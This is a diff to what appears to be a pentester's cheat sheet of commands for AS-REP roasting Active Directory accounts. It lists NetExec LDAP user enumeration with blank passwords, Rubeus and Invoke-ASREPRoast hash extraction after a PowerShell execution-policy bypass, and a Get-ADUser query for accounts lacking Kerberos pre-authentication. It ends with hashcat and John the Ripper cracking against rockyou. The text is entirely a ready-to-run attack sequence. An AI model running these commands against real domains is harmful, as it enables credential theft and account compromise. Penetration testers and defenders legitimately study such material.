@@ -95,13 +95,14 @@ run
 nxc ldap 192.168.154.134 -u "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -p '' -k
 nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt
 
-Rubeus.exe asreproast /format:john /outfile:hash.txt
+Rubeus.exe asreproast /nowrap
 
 powershell -ep bypass
 Import-Module .\ASREPRoast.ps1
 Invoke-ASREPRoast
 Invoke-ASREPRoast | select -ExpandProperty Hash > hashdump
 
+Get-ADUser -Filter "useraccountcontrol -band 4194304" -Properties useraccountcontrol | Format-Table name 
 
 hashcat -m 18200 asreproast_hashes.txt rockyou.txt
 john -w=/usr/share/wordlists/rockyou.txt hashes
